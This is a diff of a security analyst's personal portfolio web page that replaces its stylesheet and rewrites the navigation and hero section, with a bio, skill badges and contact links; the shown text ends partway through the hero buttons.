@@ -1,808 +1,1124 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Swetha Devi | SOC Analyst · Detection Engineer · Security Research</title>
-  <meta name="description" content="Swetha Devi — SOC Analyst & Detection Engineer. Portfolio featuring threat research, attack chains, detection rules, incident response playbooks.">
-  
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css" rel="stylesheet">
-  
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Swetha Devi | SOC Analyst · Detection Engineer</title>
+<meta name="description" content="Swetha Devi — SOC Analyst & Detection Engineer. Threat research, attack chains, detection rules, IR playbooks.">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#030712;
+  --surface:#0c1120;
+  --surface2:#111827;
+  --accent:#00ffc6;
+  --accent2:#0ea5e9;
+  --red:#f43f5e;
+  --amber:#f59e0b;
+  --text:#f0f4ff;
+  --muted:#6b7280;
+  --border:rgba(255,255,255,0.07);
+  --glow:rgba(0,255,198,0.15);
+  --font:'Space Grotesk',sans-serif;
+  --mono:'JetBrains Mono',monospace;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:var(--font);
+  background:var(--bg);
+  color:var(--text);
+  line-height:1.6;
+  overflow-x:hidden;
+}
 
-    :root {
-      --bg-dark: #0a0e1a;
-      --card-bg: #0f1429;
-      --accent: #00d9ff;
-      --accent-glow: rgba(0, 217, 255, 0.2);
-      --text-main: #edf2fb;
-      --text-muted: #9ca3af;
-      --border-dim: rgba(255,255,255,0.06);
-      --transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-    }
+/* ── CANVAS BACKGROUND ── */
+#bgCanvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.35;pointer-events:none}
 
-    body {
-      font-family: 'Inter', system-ui, -apple-system, sans-serif;
-      background: radial-gradient(circle at 20% 30%, rgba(0, 217, 255, 0.08), transparent 70%),
-                  linear-gradient(125deg, #020617 0%, #0a0f2a 100%);
-      background-attachment: fixed;
-      color: var(--text-main);
-      line-height: 1.6;
-      scroll-behavior: smooth;
-    }
+/* ── SCANLINE OVERLAY ── */
+body::after{
+  content:'';position:fixed;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);
+  pointer-events:none;z-index:1;
+}
 
-    @keyframes ambientShift {
-      0% { background-position: 0% 0%; }
-      100% { background-position: 100% 100%; }
-    }
-    body::before {
-      content: '';
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: radial-gradient(circle at 40% 50%, rgba(0,217,255,0.03), transparent 80%);
-      pointer-events: none;
-      z-index: -1;
-      animation: ambientShift 18s infinite alternate;
-    }
+/* ── NAV ── */
+nav{
+  position:fixed;top:0;left:0;right:0;z-index:900;
+  background:rgba(3,7,18,0.8);backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--border);
+}
+.nav-inner{
+  max-width:1200px;margin:0 auto;padding:0 28px;
+  display:flex;align-items:center;justify-content:space-between;
+  height:64px;
+}
+.logo{display:flex;align-items:center;gap:12px;text-decoration:none}
+.logo-shield{
+  width:38px;height:38px;
+  background:linear-gradient(135deg,var(--accent),#0099aa);
+  border-radius:10px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:18px;color:#030712;
+  position:relative;overflow:hidden;
+}
+.logo-shield::before{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(135deg,rgba(255,255,255,0.2),transparent);
+}
+.logo-name{font-size:16px;font-weight:700;letter-spacing:-0.02em}
+.logo-tag{font-size:11px;color:var(--muted);font-family:var(--mono);margin-top:-2px}
 
-    .container {
-      max-width: 1280px;
-      margin: 0 auto;
-      padding: 0 28px;
-    }
+.nav-links{display:flex;gap:2px;list-style:none}
+.nav-links a{
+  color:var(--muted);text-decoration:none;
+  padding:8px 16px;border-radius:8px;
+  font-size:13px;font-weight:500;transition:.2s;
+}
+.nav-links a:hover{color:var(--accent);background:rgba(0,255,198,0.07)}
+.nav-links a.active{color:var(--accent)}
 
-    nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10, 14, 26, 0.85);
-      backdrop-filter: blur(16px);
-      border-bottom: 1px solid var(--border-dim);
-    }
-    .nav-inner {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 18px 0;
-      flex-wrap: wrap;
-      gap: 16px;
-    }
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      text-decoration: none;
-    }
-    .logo-icon {
-      width: 42px;
-      height: 42px;
-      background: linear-gradient(135deg, var(--accent), #0099cc);
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 20px;
-    }
-    .logo-text h1 {
-      font-size: 18px;
-      font-weight: 700;
-    }
-    .logo-text p {
-      font-size: 12px;
-      color: var(--text-muted);
-    }
-    .nav-links {
-      display: flex;
-      gap: 8px;
-      list-style: none;
-      flex-wrap: wrap;
-    }
-    .nav-links a {
-      color: var(--text-muted);
-      text-decoration: none;
-      padding: 8px 18px;
-      border-radius: 40px;
-      font-size: 14px;
-      font-weight: 500;
-      transition: var(--transition);
-    }
-    .nav-links a:hover {
-      background: rgba(0, 217, 255, 0.1);
-      color: var(--accent);
-    }
-    .btn-primary {
-      background: linear-gradient(95deg, var(--accent), #0088aa);
-      padding: 10px 24px;
-      border-radius: 40px;
-      font-weight: 600;
-      color: #0a0e1a;
-      text-decoration: none;
-      transition: var(--transition);
-    }
-    .btn-primary:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 22px rgba(0, 217, 255, 0.3);
-    }
+.nav-cta{
+  background:var(--accent);color:#030712;
+  padding:8px 20px;border-radius:8px;
+  font-weight:600;font-size:13px;text-decoration:none;
+  transition:.2s;display:flex;align-items:center;gap:7px;
+}
+.nav-cta:hover{transform:translateY(-1px);box-shadow:0 8px 24px rgba(0,255,198,0.3)}
 
-    .hero {
-      padding: 70px 0 40px;
-    }
-    .hero h1 {
-      font-size: clamp(2.2rem, 5vw, 3.6rem);
-      font-weight: 800;
-      background: linear-gradient(135deg, #ffffff, var(--accent));
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      letter-spacing: -0.02em;
-    }
-    .dynamic-type {
-      font-size: 1.3rem;
-      color: var(--accent);
-      font-weight: 500;
-      margin: 1rem 0 1rem;
-      min-height: 3rem;
-      border-right: 2px solid var(--accent);
-      display: inline-block;
-      padding-right: 8px;
-    }
-    .badge-group {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 12px;
-      margin: 28px 0;
-    }
-    .badge {
-      background: rgba(0, 217, 255, 0.1);
-      border: 1px solid rgba(0, 217, 255, 0.3);
-      padding: 6px 18px;
-      border-radius: 40px;
-      font-size: 0.8rem;
-      font-weight: 500;
-    }
-    .button-group {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 18px;
-      margin-top: 28px;
-    }
-    .btn-outline {
-      background: rgba(15, 20, 41, 0.6);
-      backdrop-filter: blur(4px);
-      border: 1px solid var(--border-dim);
-      padding: 10px 22px;
-      border-radius: 40px;
-      color: var(--text-main);
-      text-decoration: none;
-      font-weight: 500;
-      transition: var(--transition);
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .btn-outline:hover {
-      border-color: var(--accent);
-      background: rgba(0, 217, 255, 0.08);
-      transform: translateY(-3px);
-    }
+/* ── LAYOUT ── */
+.container{max-width:1200px;margin:0 auto;padding:0 28px;position:relative;z-index:2}
+section{padding:80px 0}
 
-    .section-title {
-      font-size: 2rem;
-      font-weight: 700;
-      margin-bottom: 2rem;
-      border-left: 5px solid var(--accent);
-      padding-left: 1.2rem;
-    }
+/* ── HERO ── */
+.hero{
+  min-height:100vh;display:flex;align-items:center;
+  padding-top:80px;position:relative;z-index:2;
+}
+.hero-content{max-width:780px}
 
-    .card {
-      background: rgba(15, 20, 41, 0.7);
-      backdrop-filter: blur(8px);
-      border: 1px solid var(--border-dim);
-      border-radius: 28px;
-      padding: 1.8rem;
-      transition: var(--transition);
-    }
-    .card:hover {
-      border-color: rgba(0, 217, 255, 0.5);
-      transform: translateY(-5px);
-    }
-    
-    .about-content {
-      font-size: 1rem;
-      line-height: 1.7;
-      color: var(--text-muted);
-    }
-    
-    .skills-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-      gap: 28px;
-      margin-bottom: 48px;
-    }
-    .skill-category h3 {
-      font-size: 1.2rem;
-      margin-bottom: 1rem;
-      color: var(--accent);
-    }
-    .skill-items {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-    }
-    .skill-item {
-      background: rgba(255,255,255,0.04);
-      padding: 8px 16px;
-      border-radius: 30px;
-      font-size: 0.85rem;
-      border: 1px solid var(--border-dim);
-    }
+.status-bar{
+  display:inline-flex;align-items:center;gap:8px;
+  background:rgba(0,255,198,0.06);border:1px solid rgba(0,255,198,0.2);
+  padding:6px 14px;border-radius:100px;
+  font-family:var(--mono);font-size:11px;color:var(--accent);
+  margin-bottom:28px;animation:pulse-border 3s infinite;
+}
+.status-dot{
+  width:7px;height:7px;border-radius:50%;
+  background:var(--accent);animation:blink 1.4s infinite;
+}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
+@keyframes pulse-border{
+  0%,100%{border-color:rgba(0,255,198,0.2)}
+  50%{border-color:rgba(0,255,198,0.5)}
+}
 
-    .timeline {
-      margin-top: 20px;
-    }
-    .timeline-item {
-      background: rgba(15, 20, 41, 0.7);
-      backdrop-filter: blur(4px);
-      border-left: 4px solid var(--accent);
-      padding: 1.6rem;
-      margin-bottom: 1.5rem;
-      border-radius: 24px;
-      transition: 0.2s;
-    }
-    .timeline-item:hover {
-      transform: translateX(6px);
-      background: rgba(20, 28, 55, 0.8);
-    }
-    .timeline-item h3 {
-      font-size: 1.2rem;
-      margin-bottom: 6px;
-    }
-    .period {
-      color: var(--accent);
-      font-size: 0.85rem;
-      margin-bottom: 12px;
-    }
+.hero-title{
+  font-size:clamp(2.4rem,5.5vw,4rem);
+  font-weight:700;letter-spacing:-0.035em;
+  line-height:1.1;margin-bottom:16px;
+}
+.hero-title .line1{display:block;color:var(--text)}
+.hero-title .line2{
+  display:block;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
 
-    .blog-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
-      gap: 32px;
-      margin-top: 20px;
-    }
-    .blog-card {
-      background: rgba(15, 20, 41, 0.75);
-      backdrop-filter: blur(8px);
-      border-radius: 28px;
-      padding: 1.6rem;
-      border: 1px solid var(--border-dim);
-      transition: 0.25s ease;
-      cursor: pointer;
-    }
-    .blog-card:hover {
-      border-color: var(--accent);
-      transform: translateY(-6px);
-    }
-    .blog-card h3 {
-      font-size: 1.3rem;
-      margin-bottom: 8px;
-    }
-    .blog-meta {
-      font-size: 0.75rem;
-      color: var(--accent);
-      margin-bottom: 14px;
-    }
-    .read-link {
-      margin-top: 20px;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      color: var(--accent);
-      font-weight: 600;
-      text-decoration: none;
-      cursor: pointer;
-    }
+.typewriter-wrap{
+  height:36px;margin:18px 0 28px;
+  font-family:var(--mono);font-size:1.05rem;color:var(--accent2);
+  display:flex;align-items:center;gap:8px;
+}
+.typewriter-prefix{color:var(--muted);font-size:.9rem}
+#tw-text{font-weight:500}
+.cursor{
+  display:inline-block;width:2px;height:20px;
+  background:var(--accent2);animation:blink 1s infinite;vertical-align:middle;
+}
 
-    .connect-links {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 20px;
-      margin-top: 1rem;
-    }
+.hero-bio{
+  font-size:1rem;color:var(--muted);max-width:600px;
+  line-height:1.7;margin-bottom:32px;
+}
 
-    .contact-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 24px;
-      margin-top: 30px;
-    }
-    .contact-item {
-      background: rgba(15, 20, 41, 0.7);
-      border: 1px solid var(--border-dim);
-      border-radius: 20px;
-      padding: 1.5rem;
-      text-align: center;
-    }
-    .contact-icon {
-      width: 50px;
-      height: 50px;
-      background: rgba(0, 217, 255, 0.1);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 15px;
-      font-size: 1.5rem;
-      color: var(--accent);
-    }
+.badge-row{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:36px}
+.badge{
+  background:rgba(255,255,255,0.04);
+  border:1px solid var(--border);
+  padding:5px 14px;border-radius:100px;
+  font-size:12px;font-family:var(--mono);color:var(--muted);
+  transition:.2s;
+}
+.badge:hover{border-color:var(--accent);color:var(--accent);background:rgba(0,255,198,0.05)}
 
-    footer {
-      text-align: center;
-      padding: 2.5rem 0;
-      border-top: 1px solid var(--border-dim);
-      margin-top: 4rem;
-      color: var(--text-muted);
-      font-size: 0.85rem;
-    }
+.hero-actions{display:flex;flex-wrap:wrap;gap:12px}
+.btn-ghost{
+  display:inline-flex;align-items:center;gap:8px;
+  background:transparent;border:1px solid var(--border);
+  padding:10px 20px;border-radius:10px;
+  color:var(--text);text-decoration:none;
+  font-size:13px;font-weight:500;transition:.25s;
+}
+.btn-ghost:hover{border-color:var(--accent);color:var(--accent);background:rgba(0,255,198,0.05);transform:translateY(-2px)}
+.btn-solid{
+  display:inline-flex;align-items:center;gap:8px;
+  background:var(--accent);color:#030712;
+  padding:10px 22px;border-radius:10px;
+  font-size:13px;font-weight:700;text-decoration:none;transition:.25s;border:1px solid transparent;
+}
+.btn-solid:hover{background:transparent;color:var(--accent);border-color:var(--accent);transform:translateY(-2px)}
 
-    .modal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.95);
-      backdrop-filter: blur(20px);
-      z-index: 2000;
-      justify-content: center;
-      align-items: center;
-      overflow-y: auto;
-    }
-    .modal-content {
-      background: #0c1125;
-      max-width: 950px;
-      width: 90%;
-      margin: 2rem auto;
-      border-radius: 2rem;
-      padding: 2rem;
-      border: 1px solid rgba(0,217,255,0.4);
-      position: relative;
-    }
-    .close-modal {
-      position: absolute;
-      right: 1.5rem;
-      top: 1rem;
-      font-size: 2rem;
-      cursor: pointer;
-      color: var(--text-muted);
-      transition: 0.2s;
-    }
-    .close-modal:hover { color: var(--accent); }
-    pre {
-      background: #010314;
-      padding: 1rem;
-      border-radius: 16px;
-      overflow-x: auto;
-      font-size: 0.85rem;
-      font-family: monospace;
-      border-left: 3px solid var(--accent);
-    }
-    hr { border-color: var(--border-dim); margin: 1.5rem 0; }
-    
-    @media (max-width: 780px) {
-      .nav-links { display: none; }
-      .container { padding: 0 20px; }
-      .skills-grid { grid-template-columns: 1fr; }
-      .blog-grid { grid-template-columns: 1fr; }
-    }
-  </style>
+/* ── STATS BAR ── */
+.stats-bar{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
+  gap:1px;background:var(--border);
+  border:1px solid var(--border);border-radius:16px;
+  overflow:hidden;margin-top:60px;
+}
+.stat{
+  background:var(--surface);padding:24px 20px;
+  text-align:center;transition:.2s;
+}
+.stat:hover{background:var(--surface2)}
+.stat-num{
+  font-size:2rem;font-weight:700;font-family:var(--mono);
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.stat-label{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-top:4px}
+
+/* ── SECTION TITLE ── */
+.sec-header{margin-bottom:40px;display:flex;align-items:center;gap:16px}
+.sec-tag{
+  font-family:var(--mono);font-size:11px;color:var(--accent);
+  text-transform:uppercase;letter-spacing:.1em;
+}
+.sec-title{font-size:1.9rem;font-weight:700;letter-spacing:-0.025em}
+.sec-line{flex:1;height:1px;background:var(--border)}
+
+/* ── ABOUT / TERMINAL ── */
+.terminal{
+  background:#000;border:1px solid rgba(0,255,198,0.2);
+  border-radius:16px;overflow:hidden;font-family:var(--mono);
+}
+.term-bar{
+  background:#0a0a0a;padding:12px 16px;
+  display:flex;align-items:center;gap:8px;
+  border-bottom:1px solid rgba(255,255,255,0.06);
+}
+.term-dot{width:12px;height:12px;border-radius:50%}
+.term-body{padding:24px;font-size:13px;line-height:1.9;min-height:280px}
+.term-line{opacity:0;transform:translateX(-4px);animation:slide-in .3s forwards}
+@keyframes slide-in{to{opacity:1;transform:none}}
+.tc-green{color:var(--accent)}
+.tc-blue{color:var(--accent2)}
+.tc-yellow{color:var(--amber)}
+.tc-red{color:var(--red)}
+.tc-gray{color:var(--muted)}
+.tc-white{color:#fff}
+
+/* ── SKILLS ── */
+.skills-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:20px}
+.skill-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:16px;padding:24px;transition:.25s;
+}
+.skill-card:hover{border-color:rgba(0,255,198,0.3);transform:translateY(-4px);background:var(--surface2)}
+.skill-card-head{display:flex;align-items:center;gap:12px;margin-bottom:20px}
+.skill-icon{
+  width:40px;height:40px;border-radius:10px;
+  display:flex;align-items:center;justify-content:center;font-size:17px;
+}
+.skill-title{font-size:14px;font-weight:600}
+
+.skill-bar-item{margin-bottom:14px}
+.skill-bar-top{display:flex;justify-content:space-between;font-size:12px;margin-bottom:6px}
+.skill-bar-name{color:var(--text)}
+.skill-bar-pct{color:var(--accent);font-family:var(--mono)}
+.skill-bar-track{height:4px;background:rgba(255,255,255,0.06);border-radius:4px;overflow:hidden}
+.skill-bar-fill{
+  height:100%;border-radius:4px;width:0;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+  transition:width 1.2s cubic-bezier(.16,1,.3,1);
+}
+
+/* ── EXPERIENCE ── */
+.timeline{position:relative;padding-left:28px}
+.timeline::before{
+  content:'';position:absolute;left:0;top:8px;bottom:0;
+  width:1px;background:linear-gradient(to bottom,var(--accent),transparent);
+}
+.tl-item{
+  position:relative;margin-bottom:36px;
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:16px;padding:28px;transition:.25s;
+}
+.tl-item:hover{border-color:rgba(0,255,198,0.25);background:var(--surface2)}
+.tl-dot{
+  position:absolute;left:-34px;top:32px;
+  width:12px;height:12px;border-radius:50%;
+  background:var(--accent);
+  box-shadow:0 0 10px rgba(0,255,198,0.5);
+}
+.tl-head{display:flex;align-items:flex-start;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:10px}
+.tl-title{font-size:1.1rem;font-weight:600}
+.tl-period{
+  font-family:var(--mono);font-size:12px;color:var(--accent);
+  background:rgba(0,255,198,0.08);border:1px solid rgba(0,255,198,0.2);
+  padding:4px 12px;border-radius:100px;white-space:nowrap;
+}
+.tl-company{font-size:13px;color:var(--accent2);margin-bottom:12px}
+.tl-body{font-size:14px;color:var(--muted);line-height:1.7}
+.tl-tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:14px}
+.tl-tag{
+  background:rgba(14,165,233,0.08);border:1px solid rgba(14,165,233,0.15);
+  padding:3px 10px;border-radius:100px;font-size:11px;font-family:var(--mono);color:var(--accent2);
+}
+
+/* ── LIVE THREAT TICKER ── */
+.ticker-section{
+  background:rgba(244,63,94,0.04);
+  border-top:1px solid rgba(244,63,94,0.12);
+  border-bottom:1px solid rgba(244,63,94,0.12);
+  padding:14px 0;overflow:hidden;
+}
+.ticker-inner{display:flex;align-items:center;gap:0}
+.ticker-label{
+  background:var(--red);color:#fff;
+  font-family:var(--mono);font-size:11px;font-weight:600;
+  padding:4px 14px;border-radius:4px;white-space:nowrap;
+  margin-right:24px;flex-shrink:0;
+}
+.ticker-track{overflow:hidden;flex:1}
+.ticker-items{
+  display:flex;gap:48px;
+  animation:ticker 28s linear infinite;
+  white-space:nowrap;
+}
+.ticker-items:hover{animation-play-state:paused}
+@keyframes ticker{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+.ticker-item{
+  font-family:var(--mono);font-size:12px;
+  display:inline-flex;align-items:center;gap:8px;
+  color:var(--muted);flex-shrink:0;
+}
+.ticker-sev{
+  font-size:10px;padding:2px 7px;border-radius:4px;font-weight:600;
+}
+.sev-crit{background:rgba(244,63,94,0.15);color:var(--red)}
+.sev-high{background:rgba(245,158,11,0.15);color:var(--amber)}
+.sev-med{background:rgba(14,165,233,0.15);color:var(--accent2)}
+
+/* ── BLOG CARDS ── */
+.blog-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:24px}
+.blog-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:16px;padding:28px;
+  cursor:pointer;transition:.25s;display:flex;flex-direction:column;
+  position:relative;overflow:hidden;
+}
+.blog-card::before{
+  content:'';position:absolute;top:0;left:0;right:0;
+  height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2));
+  transform:scaleX(0);transform-origin:left;
+  transition:transform .35s ease;
+}
+.blog-card:hover::before{transform:scaleX(1)}
+.blog-card:hover{border-color:rgba(0,255,198,0.2);transform:translateY(-6px);background:var(--surface2)}
+
+.blog-cat{
+  display:inline-flex;align-items:center;gap:6px;
+  font-family:var(--mono);font-size:10px;text-transform:uppercase;
+  letter-spacing:.1em;margin-bottom:14px;
+  color:var(--accent);
+}
+.blog-title{font-size:1.1rem;font-weight:600;margin-bottom:10px;line-height:1.4}
+.blog-meta{font-size:12px;color:var(--muted);font-family:var(--mono);margin-bottom:12px}
+.blog-excerpt{font-size:13px;color:var(--muted);line-height:1.6;flex:1}
+.blog-footer{
+  display:flex;align-items:center;justify-content:space-between;
+  margin-top:20px;padding-top:16px;border-top:1px solid var(--border);
+}
+.blog-read{
+  color:var(--accent);font-size:13px;font-weight:600;
+  display:inline-flex;align-items:center;gap:6px;transition:.2s;
+}
+.blog-read:hover{gap:10px}
+.blog-tags{display:flex;gap:6px;flex-wrap:wrap}
+.blog-tag{
+  background:rgba(0,255,198,0.06);border:1px solid rgba(0,255,198,0.12);
+  padding:2px 8px;border-radius:4px;font-size:10px;
+  font-family:var(--mono);color:var(--accent);
+}
+
+/* ── MODAL ── */
+.modal-overlay{
+  display:none;position:fixed;inset:0;
+  background:rgba(0,0,0,0.92);backdrop-filter:blur(16px);
+  z-index:1000;overflow-y:auto;
+  padding:40px 20px;
+}
+.modal-overlay.open{display:block}
+.modal-box{
+  max-width:860px;margin:0 auto;
+  background:#080e1c;border:1px solid rgba(0,255,198,0.2);
+  border-radius:24px;overflow:hidden;
+  animation:modal-in .3s ease;
+}
+@keyframes modal-in{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
+.modal-top-bar{
+  background:#040a14;padding:16px 24px;
+  display:flex;align-items:center;justify-content:space-between;
+  border-bottom:1px solid var(--border);
+}
+.modal-title-row{display:flex;align-items:center;gap:12px}
+.modal-close{
+  background:none;border:none;color:var(--muted);
+  font-size:22px;cursor:pointer;padding:4px 8px;
+  transition:.2s;border-radius:6px;
+}
+.modal-close:hover{color:var(--text);background:rgba(255,255,255,0.06)}
+.modal-body{padding:36px}
+.modal-body h2{font-size:1.7rem;font-weight:700;margin-bottom:8px;letter-spacing:-0.02em}
+.modal-body h3{font-size:1.1rem;font-weight:600;color:var(--accent);margin:28px 0 10px;display:flex;align-items:center;gap:8px}
+.modal-body h3::before{content:'//';font-family:var(--mono);color:var(--muted);font-size:.9rem}
+.modal-body p{color:var(--muted);font-size:14px;line-height:1.8;margin-bottom:12px}
+.modal-body pre{
+  background:#020810;border:1px solid rgba(0,255,198,0.15);
+  border-left:3px solid var(--accent);
+  padding:20px;border-radius:12px;overflow-x:auto;
+  font-size:12px;font-family:var(--mono);line-height:1.7;
+  color:#a3e4d7;margin:16px 0;
+}
+.modal-body hr{border:none;border-top:1px solid var(--border);margin:28px 0}
+.modal-date{font-family:var(--mono);font-size:12px;color:var(--muted)}
+.mitre-grid{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0}
+.mitre-tag{
+  background:rgba(244,63,94,0.07);border:1px solid rgba(244,63,94,0.2);
+  padding:4px 12px;border-radius:6px;font-family:var(--mono);font-size:11px;color:var(--red);
+}
+
+/* ── CONNECT ── */
+.connect-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px}
+.connect-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:14px;padding:22px;text-align:center;
+  transition:.25s;text-decoration:none;color:var(--text);
+  display:block;
+}
+.connect-card:hover{border-color:var(--accent);transform:translateY(-4px);background:var(--surface2)}
+.connect-icon{
+  width:48px;height:48px;border-radius:12px;
+  background:rgba(0,255,198,0.08);border:1px solid rgba(0,255,198,0.15);
+  display:flex;align-items:center;justify-content:center;
+  font-size:20px;color:var(--accent);margin:0 auto 14px;
+}
+.connect-name{font-weight:600;font-size:15px;margin-bottom:4px}
+.connect-sub{font-size:12px;color:var(--muted)}
+
+/* ── FOOTER ── */
+footer{
+  border-top:1px solid var(--border);padding:28px 0;
+  text-align:center;font-family:var(--mono);font-size:12px;color:var(--muted);
+  position:relative;z-index:2;
+}
+footer span{color:var(--accent)}
+
+/* ── SCROLL REVEAL ── */
+.reveal{opacity:0;transform:translateY(28px);transition:opacity .65s ease,transform .65s ease}
+.reveal.visible{opacity:1;transform:none}
+
+/* ── MOBILE ── */
+@media(max-width:768px){
+  .nav-links{display:none}
+  .stats-bar{grid-template-columns:repeat(2,1fr)}
+  .blog-grid{grid-template-columns:1fr}
+  .hero-title{font-size:2.2rem}
+}
+</style>
 </head>
 <body>
 
+<canvas id="bgCanvas"></canvas>
+
+<!-- NAV -->
 <nav>
-  <div class="container">
-    <div class="nav-inner">
-      <a href="#" class="logo">
-        <div class="logo-icon"><i class="fas fa-shield-haltered"></i></div>
-        <div class="logo-text"><h1>Swetha Devi</h1><p>SOC Analyst · Detection Engineer</p></div>
-      </a>
-      <ul class="nav-links">
-        <li><a href="#about">About</a></li>
-        <li><a href="#skills">Skills</a></li>
-        <li><a href="#experience">Experience</a></li>
-        <li><a href="#research-blog">Research</a></li>
-        <li><a href="#connect">Connect</a></li>
-      </ul>
-      <a href="mailto:swethadevi1125@gmail.com" class="btn-primary"><i class="fas fa-paper-plane"></i> Contact</a>
-    </div>
+  <div class="nav-inner">
+    <a href="#" class="logo">
+      <div class="logo-shield"><i class="fas fa-shield-halved"></i></div>
+      <div>
+        <div class="logo-name">Swetha Devi</div>
+        <div class="logo-tag">SOC · Detection Engineer</div>
+      </div>
+    </a>
+    <ul class="nav-links">
+      <li><a href="#about">About</a></li>
+      <li><a href="#skills">Skills</a></li>
+      <li><a href="#experience">Experience</a></li>
+      <li><a href="#research">Research</a></li>
+      <li><a href="#connect">Connect</a></li>
+    </ul>
+    <a href="mailto:swethadevi1125@gmail.com" class="nav-cta"><i class="fas fa-paper-plane"></i> Hire Me</a>
   </div>
 </nav>
 
-<main>
+<!-- HERO -->
+<section class="hero">
   <div class="container">
-    <!-- Hero Section -->
-    <div class="hero" data-aos="fade-up">
-      <h1>Swetha Devi Sai Priya Bonu</h1>
-      <div class="dynamic-type" id="typingElement"></div>
-      <div class="badge-group">
+    <div class="hero-content">
+      <div class="status-bar">
+        <span class="status-dot"></span>
+        Available for opportunities · Hyderabad, IN
+      </div>
+      <h1 class="hero-title">
+        <span class="line1">Swetha Devi</span>
+        <span class="line2">Sai Priya Bonu</span>
+      </h1>
+      <div class="typewriter-wrap">
+        <span class="typewriter-prefix">$ whoami —&gt;&nbsp;</span>
+        <span id="tw-text"></span><span class="cursor"></span>
+      </div>
+      <p class="hero-bio">SOC Analyst and Detection Engineer with a focus on offensive-informed defense. I investigate complex attack chains, write Sigma and YARA rules, build automated detection workflows, and map incidents to the MITRE ATT&CK framework.</p>
+      <div class="badge-row">
         <span class="badge">MITRE ATT&CK</span>
         <span class="badge">Sigma / YARA</span>
-        <span class="badge">Splunk / Elastic</span>
+        <span class="badge">Splunk ES</span>
+        <span class="badge">Elastic SIEM</span>
         <span class="badge">Incident Response</span>
         <span class="badge">Threat Hunting</span>
+        <span class="badge">Python / KQL</span>
       </div>
-      <div class="button-group">
-        <a href="https://linkedin.com/in/bonu-swetha-devi-sai-priya" target="_blank" class="btn-outline"><i class="fab fa-linkedin"></i> LinkedIn</a>
-        <a href="mailto:swethadevi1125@gmail.com" class="btn-outline"><i class="fas fa-envelope"></i> Email</a>
-        <a href="https://medium.com/@swethasec" target="_blank" class="btn-outline"><i class="fab fa-medium"></i> Medium</a>
-        <a href="#research-blog" class="btn-outline"><i class="fas fa-book-open"></i> Research Blog</a>
+      <div class="hero-actions">
+        <a href="https://linkedin.com/in/bonu-swetha-devi-sai-priya" target="_blank" class="btn-ghost"><i class="fab fa-linkedin"></i> LinkedIn</a>
